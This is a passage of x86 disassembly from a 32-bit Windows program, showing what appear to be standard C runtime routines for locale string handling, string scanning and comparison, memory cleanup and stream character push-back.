  408c52:	add    esi,0x8
  408c55:	jmp    0x408c71
  408c57:	push   eax
  408c58:	call   0x407328
  408c5d:	pop    ecx
  408c5e:	cmp    eax,ebx
  408c60:	je     0x408c6b
  408c62:	mov    DWORD PTR [eax],0xdddd
  408c68:	add    eax,0x8
  408c6b:	mov    esi,eax
  408c6d:	jmp    0x408c71
  408c6f:	xor    esi,esi
  408c71:	cmp    esi,ebx
  408c73:	je     0x408cb6
  408c75:	push   DWORD PTR [ebp-0x8]
  408c78:	push   esi
  408c79:	push   edi
  408c7a:	push   DWORD PTR [ebp-0xc]
  408c7d:	push   DWORD PTR [ebp+0xc]
  408c80:	push   DWORD PTR [ebp+0x8]
  408c83:	call   DWORD PTR ds:0x40b06c
  408c89:	test   eax,eax
  408c8b:	je     0x408caf
  408c8d:	push   ebx
  408c8e:	push   ebx
  408c8f:	cmp    DWORD PTR [ebp+0x1c],ebx
  408c92:	jne    0x408c98
  408c94:	push   ebx
  408c95:	push   ebx
  408c96:	jmp    0x408c9e
  408c98:	push   DWORD PTR [ebp+0x1c]
  408c9b:	push   DWORD PTR [ebp+0x18]
  408c9e:	push   DWORD PTR [ebp-0x8]
  408ca1:	push   esi
  408ca2:	push   ebx
  408ca3:	push   DWORD PTR [ebp+0x20]
  408ca6:	call   DWORD PTR ds:0x40b124
  408cac:	mov    DWORD PTR [ebp-0x8],eax
  408caf:	push   esi
  408cb0:	call   0x408a6d
  408cb5:	pop    ecx
  408cb6:	push   DWORD PTR [ebp-0xc]
  408cb9:	call   0x408a6d
  408cbe:	mov    eax,DWORD PTR [ebp-0x8]
  408cc1:	pop    ecx
  408cc2:	jmp    0x408e20
  408cc7:	mov    DWORD PTR [ebp-0xc],ebx
  408cca:	mov    DWORD PTR [ebp-0x10],ebx
  408ccd:	cmp    DWORD PTR [ebp+0x8],ebx
  408cd0:	jne    0x408cda
  408cd2:	mov    eax,DWORD PTR [esi]
  408cd4:	mov    eax,DWORD PTR [eax+0x14]
  408cd7:	mov    DWORD PTR [ebp+0x8],eax
  408cda:	cmp    DWORD PTR [ebp+0x20],ebx
  408cdd:	jne    0x408ce7
  408cdf:	mov    eax,DWORD PTR [esi]
  408ce1:	mov    eax,DWORD PTR [eax+0x4]
  408ce4:	mov    DWORD PTR [ebp+0x20],eax
  408ce7:	push   DWORD PTR [ebp+0x8]
  408cea:	call   0x40a2cf
  408cef:	pop    ecx
  408cf0:	mov    DWORD PTR [ebp-0x14],eax
  408cf3:	cmp    eax,0xffffffff
  408cf6:	jne    0x408cff
  408cf8:	xor    eax,eax
  408cfa:	jmp    0x408e20
  408cff:	cmp    eax,DWORD PTR [ebp+0x20]
  408d02:	je     0x408de3
  408d08:	push   ebx
  408d09:	push   ebx
  408d0a:	lea    ecx,[ebp+0x14]
  408d0d:	push   ecx
  408d0e:	push   DWORD PTR [ebp+0x10]
  408d11:	push   eax
  408d12:	push   DWORD PTR [ebp+0x20]
  408d15:	call   0x40a318
  408d1a:	add    esp,0x18
  408d1d:	mov    DWORD PTR [ebp-0xc],eax
  408d20:	cmp    eax,ebx
  408d22:	je     0x408cf8
  408d24:	mov    esi,DWORD PTR ds:0x40b04c
  408d2a:	push   ebx
  408d2b:	push   ebx
  408d2c:	push   DWORD PTR [ebp+0x14]
  408d2f:	push   eax
  408d30:	push   DWORD PTR [ebp+0xc]
  408d33:	push   DWORD PTR [ebp+0x8]
  408d36:	call   esi
  408d38:	mov    DWORD PTR [ebp-0x8],eax
  408d3b:	cmp    eax,ebx
  408d3d:	jne    0x408d46
  408d3f:	xor    esi,esi
  408d41:	jmp    0x408dfd
  408d46:	jle    0x408d85
  408d48:	cmp    eax,0xffffffe0
  408d4b:	ja     0x408d85
  408d4d:	add    eax,0x8
  408d50:	cmp    eax,0x400
  408d55:	ja     0x408d6d
  408d57:	call   0x40a4d0
  408d5c:	mov    edi,esp
  408d5e:	cmp    edi,ebx
  408d60:	je     0x408d3f
  408d62:	mov    DWORD PTR [edi],0xcccc
  408d68:	add    edi,0x8
  408d6b:	jmp    0x408d87
  408d6d:	push   eax
  408d6e:	call   0x407328
  408d73:	pop    ecx
  408d74:	cmp    eax,ebx
  408d76:	je     0x408d81
  408d78:	mov    DWORD PTR [eax],0xdddd
  408d7e:	add    eax,0x8
  408d81:	mov    edi,eax
  408d83:	jmp    0x408d87
  408d85:	xor    edi,edi
  408d87:	cmp    edi,ebx
  408d89:	je     0x408d3f
  408d8b:	push   DWORD PTR [ebp-0x8]
  408d8e:	push   ebx
  408d8f:	push   edi
  408d90:	call   0x4058c0
  408d95:	add    esp,0xc
  408d98:	push   DWORD PTR [ebp-0x8]
  408d9b:	push   edi
  408d9c:	push   DWORD PTR [ebp+0x14]
  408d9f:	push   DWORD PTR [ebp-0xc]
  408da2:	push   DWORD PTR [ebp+0xc]
  408da5:	push   DWORD PTR [ebp+0x8]
  408da8:	call   esi
  408daa:	mov    DWORD PTR [ebp-0x8],eax
  408dad:	cmp    eax,ebx
  408daf:	jne    0x408db5
  408db1:	xor    esi,esi
  408db3:	jmp    0x408dda
  408db5:	push   DWORD PTR [ebp+0x1c]
  408db8:	lea    eax,[ebp-0x8]
  408dbb:	push   DWORD PTR [ebp+0x18]
  408dbe:	push   eax
  408dbf:	push   edi
  408dc0:	push   DWORD PTR [ebp+0x20]
  408dc3:	push   DWORD PTR [ebp-0x14]
  408dc6:	call   0x40a318
  408dcb:	mov    esi,eax
  408dcd:	mov    DWORD PTR [ebp-0x10],esi
  408dd0:	add    esp,0x18
  408dd3:	neg    esi
  408dd5:	sbb    esi,esi
  408dd7:	and    esi,DWORD PTR [ebp-0x8]
  408dda:	push   edi
  408ddb:	call   0x408a6d
  408de0:	pop    ecx
  408de1:	jmp    0x408dfd
  408de3:	push   DWORD PTR [ebp+0x1c]
  408de6:	push   DWORD PTR [ebp+0x18]
  408de9:	push   DWORD PTR [ebp+0x14]
  408dec:	push   DWORD PTR [ebp+0x10]
  408def:	push   DWORD PTR [ebp+0xc]
  408df2:	push   DWORD PTR [ebp+0x8]
  408df5:	call   DWORD PTR ds:0x40b04c
  408dfb:	mov    esi,eax
  408dfd:	cmp    DWORD PTR [ebp-0xc],ebx
  408e00:	je     0x408e0b
  408e02:	push   DWORD PTR [ebp-0xc]
  408e05:	call   0x402682
  408e0a:	pop    ecx
  408e0b:	mov    eax,DWORD PTR [ebp-0x10]
  408e0e:	cmp    eax,ebx
  408e10:	je     0x408e1e
  408e12:	cmp    DWORD PTR [ebp+0x18],eax
  408e15:	je     0x408e1e
  408e17:	push   eax
  408e18:	call   0x402682
  408e1d:	pop    ecx
  408e1e:	mov    eax,esi
  408e20:	lea    esp,[ebp-0x20]
  408e23:	pop    edi
  408e24:	pop    esi
  408e25:	pop    ebx
  408e26:	mov    ecx,DWORD PTR [ebp-0x4]
  408e29:	xor    ecx,ebp
  408e2b:	call   0x401d11
  408e30:	leave  
  408e31:	ret    
  408e32:	mov    edi,edi
  408e34:	push   ebp
  408e35:	mov    ebp,esp
  408e37:	sub    esp,0x10
  408e3a:	push   DWORD PTR [ebp+0x8]
  408e3d:	lea    ecx,[ebp-0x10]
  408e40:	call   0x402290
  408e45:	push   DWORD PTR [ebp+0x28]
  408e48:	lea    ecx,[ebp-0x10]
  408e4b:	push   DWORD PTR [ebp+0x24]
  408e4e:	push   DWORD PTR [ebp+0x20]
  408e51:	push   DWORD PTR [ebp+0x1c]
  408e54:	push   DWORD PTR [ebp+0x18]
  408e57:	push   DWORD PTR [ebp+0x14]
  408e5a:	push   DWORD PTR [ebp+0x10]
  408e5d:	push   DWORD PTR [ebp+0xc]
  408e60:	call   0x408a8d
  408e65:	add    esp,0x20
  408e68:	cmp    BYTE PTR [ebp-0x4],0x0
  408e6c:	je     0x408e75
  408e6e:	mov    ecx,DWORD PTR [ebp-0x8]
  408e71:	and    DWORD PTR [ecx+0x70],0xfffffffd
  408e75:	leave  
  408e76:	ret    
  408e77:	mov    edi,edi
  408e79:	push   ebp
  408e7a:	mov    ebp,esp
  408e7c:	push   ecx
  408e7d:	push   ecx
  408e7e:	mov    eax,ds:0x40e004
  408e83:	xor    eax,ebp
  408e85:	mov    DWORD PTR [ebp-0x4],eax
  408e88:	mov    eax,ds:0x40f99c
  408e8d:	push   ebx
  408e8e:	push   esi
  408e8f:	xor    ebx,ebx
  408e91:	push   edi
  408e92:	mov    edi,ecx
  408e94:	cmp    eax,ebx
  408e96:	jne    0x408ed2
  408e98:	lea    eax,[ebp-0x8]
  408e9b:	push   eax
  408e9c:	xor    esi,esi
  408e9e:	inc    esi
  408e9f:	push   esi
  408ea0:	push   0x40babc
  408ea5:	push   esi
  408ea6:	call   DWORD PTR ds:0x40b044
  408eac:	test   eax,eax
  408eae:	je     0x408eb8
  408eb0:	mov    DWORD PTR ds:0x40f99c,esi
  408eb6:	jmp    0x408eec
  408eb8:	call   DWORD PTR ds:0x40b08c
  408ebe:	cmp    eax,0x78
  408ec1:	jne    0x408ecd
  408ec3:	push   0x2
  408ec5:	pop    eax
  408ec6:	mov    ds:0x40f99c,eax
  408ecb:	jmp    0x408ed2
  408ecd:	mov    eax,ds:0x40f99c
  408ed2:	cmp    eax,0x2
  408ed5:	je     0x408faa
  408edb:	cmp    eax,ebx
  408edd:	je     0x408faa
  408ee3:	cmp    eax,0x1
  408ee6:	jne    0x408fd4
  408eec:	mov    DWORD PTR [ebp-0x8],ebx
  408eef:	cmp    DWORD PTR [ebp+0x18],ebx
  408ef2:	jne    0x408efc
  408ef4:	mov    eax,DWORD PTR [edi]
  408ef6:	mov    eax,DWORD PTR [eax+0x4]
  408ef9:	mov    DWORD PTR [ebp+0x18],eax
  408efc:	mov    esi,DWORD PTR ds:0x40b148
  408f02:	xor    eax,eax
  408f04:	cmp    DWORD PTR [ebp+0x20],ebx
  408f07:	push   ebx
  408f08:	push   ebx
  408f09:	push   DWORD PTR [ebp+0x10]
  408f0c:	setne  al
  408f0f:	push   DWORD PTR [ebp+0xc]
  408f12:	lea    eax,[eax*8+0x1]
  408f19:	push   eax
  408f1a:	push   DWORD PTR [ebp+0x18]
  408f1d:	call   esi
  408f1f:	mov    edi,eax
  408f21:	cmp    edi,ebx
  408f23:	je     0x408fd4
  408f29:	jle    0x408f67
  408f2b:	cmp    edi,0x7ffffff0
  408f31:	ja     0x408f67
  408f33:	lea    eax,[edi+edi*1+0x8]
  408f37:	cmp    eax,0x400
  408f3c:	ja     0x408f51
  408f3e:	call   0x40a4d0
  408f43:	mov    eax,esp
  408f45:	cmp    eax,ebx
  408f47:	je     0x408f65
  408f49:	mov    DWORD PTR [eax],0xcccc
  408f4f:	jmp    0x408f62
  408f51:	push   eax
  408f52:	call   0x407328
  408f57:	pop    ecx
  408f58:	cmp    eax,ebx
  408f5a:	je     0x408f65
  408f5c:	mov    DWORD PTR [eax],0xdddd
  408f62:	add    eax,0x8
  408f65:	mov    ebx,eax
  408f67:	test   ebx,ebx
  408f69:	je     0x408fd4
  408f6b:	lea    eax,[edi+edi*1]
  408f6e:	push   eax
  408f6f:	push   0x0
  408f71:	push   ebx
  408f72:	call   0x4058c0
  408f77:	add    esp,0xc
  408f7a:	push   edi
  408f7b:	push   ebx
  408f7c:	push   DWORD PTR [ebp+0x10]
  408f7f:	push   DWORD PTR [ebp+0xc]
  408f82:	push   0x1
  408f84:	push   DWORD PTR [ebp+0x18]
  408f87:	call   esi
  408f89:	test   eax,eax
  408f8b:	je     0x408f9e
  408f8d:	push   DWORD PTR [ebp+0x14]
  408f90:	push   eax
  408f91:	push   ebx
  408f92:	push   DWORD PTR [ebp+0x8]
  408f95:	call   DWORD PTR ds:0x40b044
  408f9b:	mov    DWORD PTR [ebp-0x8],eax
  408f9e:	push   ebx
  408f9f:	call   0x408a6d
  408fa4:	mov    eax,DWORD PTR [ebp-0x8]
  408fa7:	pop    ecx
  408fa8:	jmp    0x40901f
  408faa:	xor    esi,esi
  408fac:	cmp    DWORD PTR [ebp+0x1c],ebx
  408faf:	jne    0x408fb9
  408fb1:	mov    eax,DWORD PTR [edi]
  408fb3:	mov    eax,DWORD PTR [eax+0x14]
  408fb6:	mov    DWORD PTR [ebp+0x1c],eax
  408fb9:	cmp    DWORD PTR [ebp+0x18],ebx
  408fbc:	jne    0x408fc6
  408fbe:	mov    eax,DWORD PTR [edi]
  408fc0:	mov    eax,DWORD PTR [eax+0x4]
  408fc3:	mov    DWORD PTR [ebp+0x18],eax
  408fc6:	push   DWORD PTR [ebp+0x1c]
  408fc9:	call   0x40a2cf
  408fce:	pop    ecx
  408fcf:	cmp    eax,0xffffffff
  408fd2:	jne    0x408fd8
  408fd4:	xor    eax,eax
  408fd6:	jmp    0x40901f
  408fd8:	cmp    eax,DWORD PTR [ebp+0x18]
  408fdb:	je     0x408ffb
  408fdd:	push   ebx
  408fde:	push   ebx
  408fdf:	lea    ecx,[ebp+0x10]
  408fe2:	push   ecx
  408fe3:	push   DWORD PTR [ebp+0xc]
  408fe6:	push   eax
  408fe7:	push   DWORD PTR [ebp+0x18]
  408fea:	call   0x40a318
  408fef:	mov    esi,eax
  408ff1:	add    esp,0x18
  408ff4:	cmp    esi,ebx
  408ff6:	je     0x408fd4
  408ff8:	mov    DWORD PTR [ebp+0xc],esi
  408ffb:	push   DWORD PTR [ebp+0x14]
  408ffe:	push   DWORD PTR [ebp+0x10]
  409001:	push   DWORD PTR [ebp+0xc]
  409004:	push   DWORD PTR [ebp+0x8]
  409007:	push   DWORD PTR [ebp+0x1c]
  40900a:	call   DWORD PTR ds:0x40b048
  409010:	mov    edi,eax
  409012:	cmp    esi,ebx
  409014:	je     0x40901d
  409016:	push   esi
  409017:	call   0x402682
  40901c:	pop    ecx
  40901d:	mov    eax,edi
  40901f:	lea    esp,[ebp-0x14]
  409022:	pop    edi
  409023:	pop    esi
  409024:	pop    ebx
  409025:	mov    ecx,DWORD PTR [ebp-0x4]
  409028:	xor    ecx,ebp
  40902a:	call   0x401d11
  40902f:	leave  
  409030:	ret    
  409031:	mov    edi,edi
  409033:	push   ebp
  409034:	mov    ebp,esp
  409036:	sub    esp,0x10
  409039:	push   DWORD PTR [ebp+0x8]
  40903c:	lea    ecx,[ebp-0x10]
  40903f:	call   0x402290
  409044:	push   DWORD PTR [ebp+0x24]
  409047:	lea    ecx,[ebp-0x10]
  40904a:	push   DWORD PTR [ebp+0x20]
  40904d:	push   DWORD PTR [ebp+0x1c]
  409050:	push   DWORD PTR [ebp+0x18]
  409053:	push   DWORD PTR [ebp+0x14]
  409056:	push   DWORD PTR [ebp+0x10]
  409059:	push   DWORD PTR [ebp+0xc]
  40905c:	call   0x408e77
  409061:	add    esp,0x1c
  409064:	cmp    BYTE PTR [ebp-0x4],0x0
  409068:	je     0x409071
  40906a:	mov    ecx,DWORD PTR [ebp-0x8]
  40906d:	and    DWORD PTR [ecx+0x70],0xfffffffd
  409071:	leave  
  409072:	ret    
  409073:	mov    edi,edi
  409075:	push   ebp
  409076:	mov    ebp,esp
  409078:	push   esi
  409079:	mov    esi,DWORD PTR [ebp+0x8]
  40907c:	test   esi,esi
  40907e:	je     0x409205
  409084:	push   DWORD PTR [esi+0x4]
  409087:	call   0x402682
  40908c:	push   DWORD PTR [esi+0x8]
  40908f:	call   0x402682
  409094:	push   DWORD PTR [esi+0xc]
  409097:	call   0x402682
  40909c:	push   DWORD PTR [esi+0x10]
  40909f:	call   0x402682
  4090a4:	push   DWORD PTR [esi+0x14]
  4090a7:	call   0x402682
  4090ac:	push   DWORD PTR [esi+0x18]
  4090af:	call   0x402682
  4090b4:	push   DWORD PTR [esi]
  4090b6:	call   0x402682
  4090bb:	push   DWORD PTR [esi+0x20]
  4090be:	call   0x402682
  4090c3:	push   DWORD PTR [esi+0x24]
  4090c6:	call   0x402682
  4090cb:	push   DWORD PTR [esi+0x28]
  4090ce:	call   0x402682
  4090d3:	push   DWORD PTR [esi+0x2c]
  4090d6:	call   0x402682
  4090db:	push   DWORD PTR [esi+0x30]
  4090de:	call   0x402682
  4090e3:	push   DWORD PTR [esi+0x34]
  4090e6:	call   0x402682
  4090eb:	push   DWORD PTR [esi+0x1c]
  4090ee:	call   0x402682
  4090f3:	push   DWORD PTR [esi+0x38]
  4090f6:	call   0x402682
  4090fb:	push   DWORD PTR [esi+0x3c]
  4090fe:	call   0x402682
  409103:	add    esp,0x40
  409106:	push   DWORD PTR [esi+0x40]
  409109:	call   0x402682
  40910e:	push   DWORD PTR [esi+0x44]
  409111:	call   0x402682
  409116:	push   DWORD PTR [esi+0x48]
  409119:	call   0x402682
  40911e:	push   DWORD PTR [esi+0x4c]
  409121:	call   0x402682
  409126:	push   DWORD PTR [esi+0x50]
  409129:	call   0x402682
  40912e:	push   DWORD PTR [esi+0x54]
  409131:	call   0x402682
  409136:	push   DWORD PTR [esi+0x58]
  409139:	call   0x402682
  40913e:	push   DWORD PTR [esi+0x5c]
  409141:	call   0x402682
  409146:	push   DWORD PTR [esi+0x60]
  409149:	call   0x402682
  40914e:	push   DWORD PTR [esi+0x64]
  409151:	call   0x402682
  409156:	push   DWORD PTR [esi+0x68]
  409159:	call   0x402682
  40915e:	push   DWORD PTR [esi+0x6c]
  409161:	call   0x402682
  409166:	push   DWORD PTR [esi+0x70]
  409169:	call   0x402682
  40916e:	push   DWORD PTR [esi+0x74]
  409171:	call   0x402682
  409176:	push   DWORD PTR [esi+0x78]
  409179:	call   0x402682
  40917e:	push   DWORD PTR [esi+0x7c]
  409181:	call   0x402682
  409186:	add    esp,0x40
  409189:	push   DWORD PTR [esi+0x80]
  40918f:	call   0x402682
  409194:	push   DWORD PTR [esi+0x84]
  40919a:	call   0x402682
  40919f:	push   DWORD PTR [esi+0x88]
  4091a5:	call   0x402682
  4091aa:	push   DWORD PTR [esi+0x8c]
  4091b0:	call   0x402682
  4091b5:	push   DWORD PTR [esi+0x90]
  4091bb:	call   0x402682
  4091c0:	push   DWORD PTR [esi+0x94]
  4091c6:	call   0x402682
  4091cb:	push   DWORD PTR [esi+0x98]
  4091d1:	call   0x402682
  4091d6:	push   DWORD PTR [esi+0x9c]
  4091dc:	call   0x402682
  4091e1:	push   DWORD PTR [esi+0xa0]
  4091e7:	call   0x402682
  4091ec:	push   DWORD PTR [esi+0xa4]
  4091f2:	call   0x402682
  4091f7:	push   DWORD PTR [esi+0xa8]
  4091fd:	call   0x402682
  409202:	add    esp,0x2c
  409205:	pop    esi
  409206:	pop    ebp
  409207:	ret    
  409208:	mov    edi,edi
  40920a:	push   ebp
  40920b:	mov    ebp,esp
  40920d:	push   esi
  40920e:	mov    esi,DWORD PTR [ebp+0x8]
  409211:	test   esi,esi
  409213:	je     0x40924a
  409215:	mov    eax,DWORD PTR [esi]
  409217:	cmp    eax,DWORD PTR ds:0x40ed68
  40921d:	je     0x409226
  40921f:	push   eax
  409220:	call   0x402682
  409225:	pop    ecx
  409226:	mov    eax,DWORD PTR [esi+0x4]
  409229:	cmp    eax,DWORD PTR ds:0x40ed6c
  40922f:	je     0x409238
  409231:	push   eax
  409232:	call   0x402682
  409237:	pop    ecx
  409238:	mov    esi,DWORD PTR [esi+0x8]
  40923b:	cmp    esi,DWORD PTR ds:0x40ed70
  409241:	je     0x40924a
  409243:	push   esi
  409244:	call   0x402682
  409249:	pop    ecx
  40924a:	pop    esi
  40924b:	pop    ebp
  40924c:	ret    
  40924d:	mov    edi,edi
  40924f:	push   ebp
  409250:	mov    ebp,esp
  409252:	push   esi
  409253:	mov    esi,DWORD PTR [ebp+0x8]
  409256:	test   esi,esi
  409258:	je     0x4092d8
  40925a:	mov    eax,DWORD PTR [esi+0xc]
  40925d:	cmp    eax,DWORD PTR ds:0x40ed74
  409263:	je     0x40926c
  409265:	push   eax
  409266:	call   0x402682
  40926b:	pop    ecx
  40926c:	mov    eax,DWORD PTR [esi+0x10]
  40926f:	cmp    eax,DWORD PTR ds:0x40ed78
  409275:	je     0x40927e
  409277:	push   eax
  409278:	call   0x402682
  40927d:	pop    ecx
  40927e:	mov    eax,DWORD PTR [esi+0x14]
  409281:	cmp    eax,DWORD PTR ds:0x40ed7c
  409287:	je     0x409290
  409289:	push   eax
  40928a:	call   0x402682
  40928f:	pop    ecx
  409290:	mov    eax,DWORD PTR [esi+0x18]
  409293:	cmp    eax,DWORD PTR ds:0x40ed80
  409299:	je     0x4092a2
  40929b:	push   eax
  40929c:	call   0x402682
  4092a1:	pop    ecx
  4092a2:	mov    eax,DWORD PTR [esi+0x1c]
  4092a5:	cmp    eax,DWORD PTR ds:0x40ed84
  4092ab:	je     0x4092b4
  4092ad:	push   eax
  4092ae:	call   0x402682
  4092b3:	pop    ecx
  4092b4:	mov    eax,DWORD PTR [esi+0x20]
  4092b7:	cmp    eax,DWORD PTR ds:0x40ed88
  4092bd:	je     0x4092c6
  4092bf:	push   eax
  4092c0:	call   0x402682
  4092c5:	pop    ecx
  4092c6:	mov    esi,DWORD PTR [esi+0x24]
  4092c9:	cmp    esi,DWORD PTR ds:0x40ed8c
  4092cf:	je     0x4092d8
  4092d1:	push   esi
  4092d2:	call   0x402682
  4092d7:	pop    ecx
  4092d8:	pop    esi
  4092d9:	pop    ebp
  4092da:	ret    
  4092db:	int3   
  4092dc:	int3   
  4092dd:	int3   
  4092de:	int3   
  4092df:	int3   
  4092e0:	push   ebp
  4092e1:	mov    ebp,esp
  4092e3:	push   esi
  4092e4:	xor    eax,eax
  4092e6:	push   eax
  4092e7:	push   eax
  4092e8:	push   eax
  4092e9:	push   eax
  4092ea:	push   eax
  4092eb:	push   eax
  4092ec:	push   eax
  4092ed:	push   eax
  4092ee:	mov    edx,DWORD PTR [ebp+0xc]
  4092f1:	lea    ecx,[ecx+0x0]
  4092f4:	mov    al,BYTE PTR [edx]
  4092f6:	or     al,al
  4092f8:	je     0x409303
  4092fa:	add    edx,0x1
  4092fd:	bts    DWORD PTR [esp],eax
  409301:	jmp    0x4092f4
  409303:	mov    esi,DWORD PTR [ebp+0x8]
  409306:	or     ecx,0xffffffff
  409309:	lea    ecx,[ecx+0x0]
  40930c:	add    ecx,0x1
  40930f:	mov    al,BYTE PTR [esi]
  409311:	or     al,al
  409313:	je     0x40931e
  409315:	add    esi,0x1
  409318:	bt     DWORD PTR [esp],eax
  40931c:	jae    0x40930c
  40931e:	mov    eax,ecx
  409320:	add    esp,0x20
  409323:	pop    esi
  409324:	leave  
  409325:	ret    
  409326:	int3   
  409327:	int3   
  409328:	int3   
  409329:	int3   
  40932a:	int3   
  40932b:	int3   
  40932c:	int3   
  40932d:	int3   
  40932e:	int3   
  40932f:	int3   
  409330:	mov    edx,DWORD PTR [esp+0x4]
  409334:	mov    ecx,DWORD PTR [esp+0x8]
  409338:	test   edx,0x3
  40933e:	jne    0x40937c
  409340:	mov    eax,DWORD PTR [edx]
  409342:	cmp    al,BYTE PTR [ecx]
  409344:	jne    0x409374
  409346:	or     al,al
  409348:	je     0x409370
  40934a:	cmp    ah,BYTE PTR [ecx+0x1]
  40934d:	jne    0x409374
  40934f:	or     ah,ah
  409351:	je     0x409370
  409353:	shr    eax,0x10
  409356:	cmp    al,BYTE PTR [ecx+0x2]
  409359:	jne    0x409374
  40935b:	or     al,al
  40935d:	je     0x409370
  40935f:	cmp    ah,BYTE PTR [ecx+0x3]
  409362:	jne    0x409374
  409364:	add    ecx,0x4
  409367:	add    edx,0x4
  40936a:	or     ah,ah
  40936c:	jne    0x409340
  40936e:	mov    edi,edi
  409370:	xor    eax,eax
  409372:	ret    
  409373:	nop
  409374:	sbb    eax,eax
  409376:	shl    eax,1
  409378:	add    eax,0x1
  40937b:	ret    
  40937c:	test   edx,0x1
  409382:	je     0x40939c
  409384:	mov    al,BYTE PTR [edx]
  409386:	add    edx,0x1
  409389:	cmp    al,BYTE PTR [ecx]
  40938b:	jne    0x409374
  40938d:	add    ecx,0x1
  409390:	or     al,al
  409392:	je     0x409370
  409394:	test   edx,0x2
  40939a:	je     0x409340
  40939c:	mov    ax,WORD PTR [edx]
  40939f:	add    edx,0x2
  4093a2:	cmp    al,BYTE PTR [ecx]
  4093a4:	jne    0x409374
  4093a6:	or     al,al
  4093a8:	je     0x409370
  4093aa:	cmp    ah,BYTE PTR [ecx+0x1]
  4093ad:	jne    0x409374
  4093af:	or     ah,ah
  4093b1:	je     0x409370
  4093b3:	add    ecx,0x2
  4093b6:	jmp    0x409340
  4093b8:	int3   
  4093b9:	int3   
  4093ba:	int3   
  4093bb:	int3   
  4093bc:	int3   
  4093bd:	int3   
  4093be:	int3   
  4093bf:	int3   
  4093c0:	push   ebp
  4093c1:	mov    ebp,esp
  4093c3:	push   esi
  4093c4:	xor    eax,eax
  4093c6:	push   eax
  4093c7:	push   eax
  4093c8:	push   eax
  4093c9:	push   eax
  4093ca:	push   eax
  4093cb:	push   eax
  4093cc:	push   eax
  4093cd:	push   eax
  4093ce:	mov    edx,DWORD PTR [ebp+0xc]
  4093d1:	lea    ecx,[ecx+0x0]
  4093d4:	mov    al,BYTE PTR [edx]
  4093d6:	or     al,al
  4093d8:	je     0x4093e3
  4093da:	add    edx,0x1
  4093dd:	bts    DWORD PTR [esp],eax
  4093e1:	jmp    0x4093d4
  4093e3:	mov    esi,DWORD PTR [ebp+0x8]
  4093e6:	mov    edi,edi
  4093e8:	mov    al,BYTE PTR [esi]
  4093ea:	or     al,al
  4093ec:	je     0x4093fa
  4093ee:	add    esi,0x1
  4093f1:	bt     DWORD PTR [esp],eax
  4093f5:	jae    0x4093e8
  4093f7:	lea    eax,[esi-0x1]
  4093fa:	add    esp,0x20
  4093fd:	pop    esi
  4093fe:	leave  
  4093ff:	ret    
  409400:	mov    edi,edi
  409402:	push   ebp
  409403:	mov    ebp,esp
  409405:	push   ecx
  409406:	push   esi
  409407:	mov    esi,DWORD PTR [ebp+0xc]
  40940a:	push   esi
  40940b:	call   0x404a09
  409410:	mov    DWORD PTR [ebp+0xc],eax
  409413:	mov    eax,DWORD PTR [esi+0xc]
  409416:	pop    ecx
  409417:	test   al,0x82
  409419:	jne    0x409434
  40941b:	call   0x4024b6
  409420:	mov    DWORD PTR [eax],0x9
  409426:	or     DWORD PTR [esi+0xc],0x20
  40942a:	mov    eax,0xffff
  40942f:	jmp    0x409571
  409434:	test   al,0x40
  409436:	je     0x409445
  409438:	call   0x4024b6
  40943d:	mov    DWORD PTR [eax],0x22
  409443:	jmp    0x409426
  409445:	test   al,0x1
  409447:	je     0x409460
  409449:	and    DWORD PTR [esi+0x4],0x0
  40944d:	test   al,0x10
  40944f:	je     0x4094e2
  409455:	mov    ecx,DWORD PTR [esi+0x8]
  409458:	and    eax,0xfffffffe
  40945b:	mov    DWORD PTR [esi],ecx
  40945d:	mov    DWORD PTR [esi+0xc],eax
  409460:	mov    eax,DWORD PTR [esi+0xc]
  409463:	and    DWORD PTR [esi+0x4],0x0
  409467:	and    DWORD PTR [ebp-0x4],0x0
  40946b:	push   ebx
  40946c:	push   0x2
  40946e:	and    eax,0xffffffef
  409471:	pop    ebx
  409472:	or     eax,ebx
  409474:	mov    DWORD PTR [esi+0xc],eax
  409477:	test   eax,0x10c
  40947c:	jne    0x4094aa
  40947e:	call   0x404854
  409483:	add    eax,0x20
  409486:	cmp    esi,eax
  409488:	je     0x409496
  40948a:	call   0x404854
  40948f:	add    eax,0x40
  409492:	cmp    esi,eax
  409494:	jne    0x4094a3
  409496:	push   DWORD PTR [ebp+0xc]
  409499:	call   0x4047f0
  40949e:	pop    ecx
  40949f:	test   eax,eax
  4094a1:	jne    0x4094aa
  4094a3:	push   esi
  4094a4:	call   0x4047a7
  4094a9:	pop    ecx
  4094aa:	test   DWORD PTR [esi+0xc],0x108
  4094b1:	push   edi
  4094b2:	je     0x40953b
  4094b8:	mov    eax,DWORD PTR [esi+0x8]
  4094bb:	mov    edi,DWORD PTR [esi]
  4094bd:	lea    ecx,[eax+0x2]
  4094c0:	mov    DWORD PTR [esi],ecx
  4094c2:	mov    ecx,DWORD PTR [esi+0x18]
  4094c5:	sub    edi,eax
  4094c7:	sub    ecx,ebx
  4094c9:	mov    DWORD PTR [esi+0x4],ecx
  4094cc:	test   edi,edi
  4094ce:	jle    0x4094ed
  4094d0:	push   edi
  4094d1:	push   eax
  4094d2:	push   DWORD PTR [ebp+0xc]
  4094d5:	call   0x4046cb
  4094da:	add    esp,0xc
  4094dd:	mov    DWORD PTR [ebp-0x4],eax
  4094e0:	jmp    0x409530
  4094e2:	or     eax,0x20
  4094e5:	mov    DWORD PTR [esi+0xc],eax
  4094e8:	jmp    0x40942a
  4094ed:	mov    ecx,DWORD PTR [ebp+0xc]
  4094f0:	cmp    ecx,0xffffffff
  4094f3:	je     0x409510
  4094f5:	cmp    ecx,0xfffffffe
  4094f8:	je     0x409510
  4094fa:	mov    eax,ecx
  4094fc:	and    eax,0x1f
  4094ff:	mov    edx,ecx
  409501:	sar    edx,0x5
  409504:	shl    eax,0x6
  409507:	add    eax,DWORD PTR [edx*4+0x412460]
  40950e:	jmp    0x409515
  409510:	mov    eax,0x40e250
  409515:	test   BYTE PTR [eax+0x4],0x20
  409519:	je     0x409530
  40951b:	push   ebx
  40951c:	push   0x0
  40951e:	push   0x0
  409520:	push   ecx
  409521:	call   0x403e7f
  409526:	and    eax,edx
  409528:	add    esp,0x10
  40952b:	cmp    eax,0xffffffff
  40952e:	je     0x40955d
  409530:	mov    eax,DWORD PTR [esi+0x8]
  409533:	mov    ebx,DWORD PTR [ebp+0x8]
  409536:	mov    WORD PTR [eax],bx
  409539:	jmp    0x409558
  40953b:	push   0x2
  40953d:	lea    eax,[ebp-0x4]
  409540:	push   eax
  409541:	push   DWORD PTR [ebp+0xc]
  409544:	mov    edi,ebx
  409546:	mov    ebx,DWORD PTR [ebp+0x8]
